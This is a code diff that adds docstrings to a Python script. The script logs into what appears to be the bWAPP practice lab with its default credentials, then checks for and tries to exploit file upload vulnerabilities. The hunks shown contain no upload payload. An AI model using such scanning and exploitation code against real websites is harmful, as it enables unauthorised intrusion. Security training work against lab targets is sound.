@@ -3,16 +3,31 @@ import requests
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
-# Function to create a requests session with retry strategy
 def create_session():
+    """
+    Creates a requests session with a retry strategy.
+    
+    Returns:
+        requests.Session: A session object configured with retries and headers.
+    """
     session = requests.Session()
     retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
     session.mount('http://', HTTPAdapter(max_retries=retries))
-    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
+    })
     return session
 
-# Function to login and create a session
 def login(session, url, username, password):
+    """
+    Logs into a website using the provided session, URL, username, and password.
+    
+    Args:
+        session (requests.Session): The session object to use for the login.
+        url (str): The base URL of the website.
+        username (str): The username for login.
+        password (str): The password for login.
+    """
     login_url = url + "/login.php"
     login_data = {
         'login': username,
@@ -23,6 +38,16 @@ def login(session, url, username, password):
     session.post(login_url, data=login_data)
 
 def file_upload_vulnerability(session, url):
+    """
+    Checks for a file upload vulnerability on the specified URL.
+    
+    Args:
+        session (requests.Session): The session object to use for the request.
+        url (str): The URL to check for the file upload vulnerability.
+    
+    Returns:
+        str: A message indicating whether a file upload function is available and the result of the attempt.
+    """
     try:
         page = session.get(url)
         soup = BeautifulSoup(page.content, 'html.parser')
@@ -41,6 +66,15 @@ def file_upload_vulnerability(session, url):
         return f"Error accessing {url}: {e}"
 
 def check_and_exploit_file_upload(target_url):
+    """
+    Checks and exploits a file upload vulnerability on the target URL.
+    
+    Args:
+        target_url (str): The base URL of the target website.
+    
+    Returns:
+        list: A list of results indicating the outcome of the vulnerability check and exploitation attempt.
+    """
     username = "bee"
     password = "bug"
     base_url = target_url
